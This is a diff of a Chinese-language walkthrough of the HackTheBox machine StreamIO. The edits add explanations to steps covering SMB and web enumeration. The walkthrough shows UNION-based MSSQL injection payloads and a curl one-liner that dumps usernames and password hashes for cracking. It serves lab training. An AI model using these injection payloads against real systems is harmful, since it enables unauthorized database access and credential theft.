@@ -176,9 +176,9 @@ Nmap done: 1 IP address (1 host up) scanned in 108.90 seconds
 10.129.6.162 watch.streamIO.htb streamIO.htb
 ```
 
-### SMB 服务渗透
+## SMB 服务渗透
 
-
+提供一个自定义的用户给 smbmap 尝试扫描，访问被拒绝，无有价值的信息暴露。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -201,20 +201,36 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 [*] Closed 1 connections
 ```
 
+使用 smbclient 进行匿名访问同样拒绝。
+
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ smbclient -L //10.129.6.162 -N
 session setup failed: NT_STATUS_ACCESS_DENIED
 ```
 
+使用 crackmapexec 尝试枚举 smb，
+
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ crackmapexec smb 10.129.6.162
 SMB         10.129.6.162    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
-
 ```
 
+- 445 端口开放，SMB 服务正常运行
+- 机器名为 DC，即 Domain Controller（域控制器）
+- 域名为 streamIO.htb
+- 靶机运行的系统版本为 Windows 10 / Server 2019
+- SMB 签名已启用，防止中间人攻击
+- SMBv1 已关闭
+
+## Web 渗透
+
+访问` http://streamio.htb`，无有价值的发现。
+
 ![](Pasted%20image%2020260319152602.png)
+
+执行 gobuster 目录爆破。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -243,14 +259,25 @@ Finished
 ===============================================================
 ```
 
+无有价值的信息发现。
+
+访问 `http://streamio.htb`。
 
 ![](Pasted%20image%2020260319153008.png)
 
+`Home` 页面可以进行注册登入操作。
+
 ![](Pasted%20image%2020260319154053.png)
+
+创建一个新用户
 
 ![](Pasted%20image%2020260321144652.png)
 
+使用创建的新用户进行登入，但是登入失败了。
+
 ![](Pasted%20image%2020260321144702.png)
+
+进一步进行目录爆破。
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
@@ -294,89 +321,72 @@ Finished
 ===============================================================
 ```
 
+未发现更多有价值的目录。
+
+### SQL 注入
+
+访问先前发现的 `https://watch.streamio.htb`，是一个电影管理系统。
+
 ![](Pasted%20image%2020260319153446.png)
 
-`' or 1=1 -- -`
+尝试进行 sql 注入，执行语句 `' or 1=1 -- -` 发现跳转到 `blocked.php` 界面，提示访问被拒绝。
 
 ![](Pasted%20image%2020260321144918.png)
 
-`12`
+搜索一个页面电影中存在的关键词 `12`，返回所有包含该关键词的电影。
 
 ![](Pasted%20image%2020260321145017.png)
 
-```bash
-┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
-└─$ sudo gobuster dir -u https://watch.streamio.htb/ --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,php.bak,jsp,zip,tar,html,txt,tar,tar.gz,git,js,md -k
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     https://watch.streamio.htb/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              zip,txt,md,php,jsp,tar,html,tar.gz,git,js,php.bak
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/index.php            (Status: 200) [Size: 2829]
-/search.php           (Status: 200) [Size: 253887]
-/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
-/Search.php           (Status: 200) [Size: 253887]
-/Index.php            (Status: 200) [Size: 2829]
-Progress: 45954 / 2646732 (1.74%)^C
-[!] Keyboard interrupt detected, terminating.
-Progress: 45964 / 2646732 (1.74%)
-===============================================================
-Finished
-===============================================================
-```
+MSSQL（Microsoft SQL Server）是微软的产品，专为 Windows 设计，Windows Server + AD 域数据库首选 MSSQL，推测 sql 查询应该存在模糊查询，可能为 
 
-`e' and 1=1 -- -`
+`select * from movie where film like '%[input]%'`
+
+进一步注入语句 `e' and 1=1 -- -`，这个语句使得 sql 查询变为 `selcet * from movie where film like '%e' and 1=1 -- -%'`，查询出所有带有 `e` 的电影。
 
 ![](Pasted%20image%2020260321160059.png)
 
-`e' orderby 1 -- -`
+尝试注入语句 `e' orderby 1 -- -` 猜测列数。
 
 ![](Pasted%20image%2020260321160139.png)
 
-`SELECT * FROM movies WHERE title LIKE '%[input]%'
-
-`enil' union select 1,2,3,4,5,6 -- -`
+逐个测试直至语句 `enil' union select 1,2,3,4,5,6 -- -` 测试出列数为 6，回显位置为 2、3。
 
 ![](Pasted%20image%2020260321160342.png)
 
-`enil' union select 1,@@version,3,4,5,6 -- -` 
+使用 `enil' union select 1,@@version,3,4,5,6 -- -` 查询数据库的版本。为 Microsoft SQL Server 2019。
 
 ![](Pasted%20image%2020260324162747.png)
 
-`enil' union select 1,name,3,4,5,6 from master..sysdatabases -- -`
+执行 `enil' union select 1,name,3,4,5,6 from master..sysdatabases -- -` 查询 `master` 数据库中的 `sysdatabases` 表中的数据。
 
 ![](Pasted%20image%2020260324163045.png)
 
-`enil' union select 1,(select DB_NAME()),3,4,5,6 from master..sysdatabases -- -`
+当前数据库应该为 `STREAMIO`。
+
+执行 `enil' union select 1,(select DB_NAME()),3,4,5,6 from master..sysdatabases -- -` 查询当前正在使用的数据库名称为 `STREAMIO`。
 
 ![](Pasted%20image%2020260324163144.png)
 
-`enil' union select 1,name,id,4,5,6 from streamio..sysobjects where xtype='U' -- -`
+执行 `enil' union select 1,name,id,4,5,6 from streamio..sysobjects where xtype='U' -- -` 查找 id 与 name。
+
+`sysobjects` 是一个系统表，包含了有关数据库中的对象（例如表、视图、储存过程）的元数据信息。在这个查询中，`xtype` 是 `sysobjects` 表中的一个列，表示对象类型。`where xtype="U"` 是一个条件，限制了结果集中只返回对象类型为 “U” （User Table）的行。这个条件过滤了只有用户表的信息被检索出来，其他类型的对象被排除。
 
 ![](Pasted%20image%2020260324163327.png)
 
-`enil' union select 1,name,id,4,5,6 from streamio..syscolumns where id in  (885578193,901578250) -- -`
+执行 `enil' union select 1,name,id,4,5,6 from streamio..syscolumns where id in  (885578193,901578250) -- -` 获取字段名。
 
 ![](Pasted%20image%2020260324163439.png)
 
-`enil' union select 1,concat(username,':',password),id,4,5,6 from users -- -`
+执行 `enil' union select 1,concat(username,':',password),id,4,5,6 from users -- -` 获取 username 与 password。
 
 ![](Pasted%20image%2020260324163639.png)
 
 ![](Pasted%20image%2020260324163652.png)
 
+使用 curl 提取有效字段。
+
 ```bash
-┌──(kali㉿kali)-[~/Work/Kali/StreamIO]                                                                                                                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ curl -X POST 'https://watch.streamio.htb/search.php' -d "q=enil' union select 1,concat(username,':',password),id,4,5,6 from users -- -" -k -s | grep h5 | sed -e 's/<h5 class="p-2">//g' -e 's/<\/h5>//g' | tr -d " \t" | tee hash.lst                                                                                  
 admin:665a50ac9eaa781e4f7f04199db97a11                                                                                                                                                                                                                                                                                      
 Alexendra:1c2b3d8270321140e5153f6637d3ee53                                     
@@ -442,6 +452,8 @@ Victoria:b22abb47a02b52d5dfa27fb0b534f693
 William:d62be0dc82071bccc1322d64ec5b6c51                                       
 yoshihide:b779ba15cedfd22a023c4d8bcf5f2332 
 ```
+
+### Hashcat 暴力破解
 
 ```bash
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
